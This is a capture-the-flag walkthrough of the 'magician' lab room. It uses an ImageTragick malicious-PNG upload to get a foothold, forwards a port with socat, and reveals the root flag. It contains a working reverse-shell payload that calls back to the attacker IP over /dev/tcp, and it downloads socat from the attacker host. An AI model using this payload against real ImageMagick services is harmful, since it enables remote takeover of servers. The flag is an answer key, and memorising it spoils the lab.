# magician

This magical website lets you convert image file formats.

Note: this machine needs about 7 minutes to start up, please be patient :)

Please add the IP address of this machine with the hostname "magician" to your /etc/hosts file on Linux before you start.
On Windows, the hosts file should be at C:\Windows\System32\drivers\etc\hosts.

Use the hostname instead of the IP address if you want to upload a file. This is required for the room to work correctly ;)

Have fun and use your magic skills!

## Initial foothold

Let's first add the hostname to our hosts file, as told above:

~~~
echo "10.10.100.95 magician" | sudo tee -a /etc/hosts

## FTP

Attempting to connect to the FTP service as anonymous will succeed and provide us with a hint. However, there is nothing else to expect.

~~~
kali@kali:/data/vpn$ ftp magician

230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...

## Web (8080)

Browsing http://magician:8080 will show a page that converts a PNG file to a JPG file.

As the hint given by the FTP was referring to a vulnerability (https://imagetragick.com, CVE-2016â€“3714), we can guess that we have to exploit this vulnerability by uploading a malicious PNG file.

After several failed attempts, I eventually found a working exploit [here](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/Picture%20Image%20Magik#exploit-v1). Below is the code to make the malicious PNG file:

~~~
kali@kali:/data/magician/files$ cat > image.png << EOF
> push graphic-context
> encoding "UTF-8"
> viewbox 0 0 1 1
> affine 1 0 0 1 0 0
> push graphic-context
> image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
> pop graphic-context
> pop graphic-context
> EOF
~~~

open a listener and upload the image using the web form. A reverse shell spawns in our listener window:

~~~
kali@kali:/data/magician/files$ rlwrap nc -nlvp 4444

## Hint

Still connected as `magician`, there is a hint in the `/home/magician/` directory:

~~~
magician@magician:~$ cat the_magic_continues
cat the_magic_continues
The magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.
~~~

Following the hint, I checked the network connections with `netstat`, which revealed a weird connection on port `6666`. This is however only available for `localhost`.

~~~
magician@magician:/tmp/hsperfdata_magician/uploads$ netstat -putan
netstat -putan

## The program on port 6666

Let's use `socat` to forward the local port and make the program available to the outside.

Transfer the `socat` binary from your Kali box to the server and use it to forward local port `6666` to port `7777`:

~~~
magician@magician:~$ wget http://10.8.50.72:8000/socat
magician@magician:~$ chmod +x socat
magician@magician:~$ ./socat tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
~~~

Now, connecting in a browser to port `7777` (http://magician:7777/) shows a new page that allows to read files. The program is likely run by `root` as it allows to read the root flag:

![the_magic_cat.png](files/the_magic_cat.png)

Press Submit until you get a base64 encoded string (the program is rotating through a bunch of encodings, including hex, binary, md5, base64).

Once we have our root flag as base64 encoded string, let's decode it:

~~~
kali@kali:/data/src$ echo "VEhNe21hZ2ljX21heV9tYWtlX21hbnlfbWVuX21hZH0K" | base64 -d
THM{magic_may_make_many_men_mad}
~~~

Root flag: `THM{magic_may_make_many_men_mad}`
